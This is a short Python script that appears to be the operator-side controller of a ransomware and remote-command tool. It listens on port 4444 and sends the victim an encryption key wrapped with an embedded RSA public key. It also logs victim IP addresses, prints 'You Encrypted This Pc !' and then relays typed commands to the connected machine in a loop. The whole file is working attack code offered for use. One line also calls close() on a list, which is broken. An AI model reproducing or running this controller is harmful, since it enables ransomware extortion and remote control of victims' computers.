import socket
from time import sleep 
import os
import os.path
from Crypto import Random
import threading 
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA


def recv(client):
     while True:
          data = client.recv(5000)
          if len(data) != 0:
               print(data)
def client():
     try:
          public_key  = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjOBefeyUpBILyoJGxlNM
cpykg2MrU7K2rzKKGZkX2sEsHNe5Z+UEl0UOneX+UWYexzJWJaZjNg0983kZXEKx
lZatK6nk5eEFpQqE3fteKWBc+KdfotspcQ64zR38Q6wOgse40eWRV4Fv6Lu7LeUb
N7Nd4Jm8t/ACXxPLwy08K2PA4DO/5AL8Obu3LR6Sf3EE0og/hbHMfFKSBbKVG0/P
M9FiXAwbBYvQnbcxyfzf8BT167s1TLQckNWZoU8l/es0Ze56+4ZwoOTd6ffyiZCt
ogyH0Cm40M2k6c70n5L8G+SIU0fd10goXWpytXofNJCGJVaTyDmcpMZ+y5jj2zzF
wwIDAQAB
-----END PUBLIC KEY-----"""
          en = RSA.importKey(public_key )
          en_key = PKCS1_OAEP.new(en)
          my_key =input( "Key >>> ".strip(" " ) ).encode('ascii')
          key  = en_key.encrypt(my_key)
          host , port = '127.0.0.1' , 4444
          s = socket.socket(socket.AF_INET , socket.SOCK_STREAM )
          s.setblocking(1)
          s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR , 1)
          s.bind((host , port ))
          s.listen(4)
          arg , addr = s.accept()
          logfile = open("logfile.txt" , 'a+')
          logfile.write(addr[0] + "\n")
          logfile.close()
          read_logfile = open("logfile.txt" , 'r')
          ip_in_log = read_logfile.readlines()
          ip_in_log.close()
          arg.send(key)
          print('Connect By {0}:{1} '.format(addr[0]  , addr[1]) )
          if ip_in_log[0].strip("\n") == addr[0]:
               print("You Encrypted This Pc ! ")
          else:pass
          t_h = threading.Thread(target=recv, args=(arg,))
          t_h.start()
          while True:
               command = input('Command:').strip(" ")
               command = command.encode('ascii')
               arg.send(command)
     except socket.error as e  :
          print(e)
          s.close()
          sleep(1)
          client()


client()
